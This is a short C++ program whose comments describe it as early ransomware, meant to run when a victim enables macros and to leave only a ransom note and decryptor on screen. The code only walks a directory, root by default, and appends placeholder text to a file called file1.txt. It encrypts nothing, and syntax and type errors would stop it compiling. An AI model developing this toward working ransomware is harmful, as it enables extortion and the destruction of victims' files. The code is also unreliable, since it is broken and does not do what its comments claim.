#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <fstream>
#include <iostream>

using namespace std;

/*
- Execute the program once "enable macros" is clicked
- Let the operative system only display the ransom note and the tools to recover files (decryptor programm)
*/

int main(int argc, const char**argv) {
    struct dirent *entry = nullptr;
    DIR *dp = nullptr;

    dp = opendir(argc > 1 ? argv[1] : "/"); // If nothing entered on args we'll go to root
    cout<<dp<<endl;


    // Only browsing by the entry given. Not all the directories on the computer
    if (dp != nullptr) {
        while ((entry = readdir(dp)))
        	char* file_name = entry->d_name;
        	printf("%s\n", file_name);

        	if(entry->d_name.compare("file1.txt") == 0){
        		fstream fs;
  				fs.open (entry->d_name, fstream::in | fstream::out | std::fstream::app);

  				if (fs.is_open()){
					cout << "Operation successfully performed";
					fs << " more lorem ipsum";
					fs.close();
  				}
	  			else
	  			{
	    			cout << "Error opening file";
	  			}
        	}

    }
    closedir(dp);
    return 0;
} 

